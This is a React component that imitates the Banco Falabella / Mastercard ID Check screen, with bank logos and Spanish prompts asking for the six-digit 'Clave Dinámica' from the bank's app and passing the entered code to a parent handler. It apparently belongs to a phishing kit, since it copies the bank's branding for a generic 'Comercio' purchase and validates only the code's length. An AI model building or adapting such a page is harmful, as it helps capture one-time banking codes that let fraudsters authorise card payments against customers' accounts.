import React, { useState } from 'react';
import './FalabellaIDCheck.css';
import FalabellaDIN from "../img/falabellaTL.webp"
import FalabellaLOGO from "../img/Logotipo_Banco_Falabella.svg.png"
import logoMastercard from "../img/logo-Mastercard.png"
export default function FalabellaIDCheck({ onSubmit, onCancel }) {
  const [code, setCode] = useState('');
  const [error, setError] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (code.length === 6) {
      if (onSubmit) onSubmit(code);
      else console.log('Falabella ID Check Code:', code);
    } else {
      setError(true);
    }
  };

  return (
    <div className="falabella-container">
      <div className="falabella-card">
        {/* HEADER LOGOS */}
        <div className="falabella-header">
          <div className="falabella-logo-placeholder">
            {/* Tratamos de cargar el logo si existe, de lo contrario muestra texto decorativo */}
            <img src={FalabellaLOGO} alt="Falabella" />
          </div>
          <div className="falabella-idcheck-placeholder">
            <img src={logoMastercard} alt="Mastercard" className="mastercard-logo" />
            <div className="idcheck-separator"></div>
            <div className="idcheck-text">
              <span className="id-text">ID</span>
              <span className="check-text">Check</span>
            </div>
          </div>
        </div>

        <div className="falabella-body">
          {/* TÍTULO */}
          <div className="falabella-title-section">
            <h1 className="falabella-title">
              ¡Queremos asegurarnos que eres tú!
            </h1>
            <p className="falabella-subtitle">
              Ingresa tu <strong>CLAVE DINÁMICA</strong> que encontrarás en tu APP BANCO
              FALABELLA y autoriza la compra en <strong>Comercio</strong>.
            </p>
          </div>

          {/* ILUSTRACIÓN CELULAR */}
          <div className="falabella-illustration">
            <div className="falabella-phone-mockup">
              <img src={FalabellaDIN} alt="Falabella" />
            </div>
          </div>

          {/* INPUT */}
          <form onSubmit={handleSubmit} className="falabella-form">
            <div className="falabella-input-group">
              <label className="falabella-label">
                Ingreso de Clave Dinámica:
              </label>
              <input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={code}
                onChange={(e) => {
                  setCode(e.target.value.replace(/\D/g, ''));
                  setError(false);
                }}
                className={`falabella-input ${error ? 'falabella-input--error' : ''}`}
                placeholder=""
              />
              {error && (
                <p className="falabella-error-text">Clave incorrecta. Verifica e intenta de nuevo.</p>
              )}
            </div>

            <button
              type="submit"
              className={`falabella-btn-primary ${code.length === 6 ? 'falabella-btn-primary--active' : ''}`}
            >
              Ingresar
            </button>
          </form>

          {/* ACORDEONES AYUDA */}
          <div className="falabella-accordion-section">
            <details className="falabella-details">
              <summary className="falabella-summary">
                <span>¿Tienes problema con la validación?</span>
                <span className="falabella-summary-icon">+</span>
              </summary>
              <p className="falabella-details-content">
                Contacta a tu banco o intenta generar una nueva clave en la app.
              </p>
            </details>
            <details className="falabella-details">
              <summary className="falabella-summary">
                <span>¿Por qué tengo que comprobar mi identidad?</span>
                <span className="falabella-summary-icon">+</span>
              </summary>
              <p className="falabella-details-content">
                Es un requisito de seguridad para proteger tus compras en línea.
              </p>
            </details>
          </div>
        </div>

        {/* CANCELAR */}
        <div className="falabella-footer">
          <button
            type="button"
            onClick={onCancel || (() => console.log('Cancelado'))}
            className="falabella-cancel"
          >
            Cancelar
          </button>
        </div>
      </div>
    </div>
  );
}
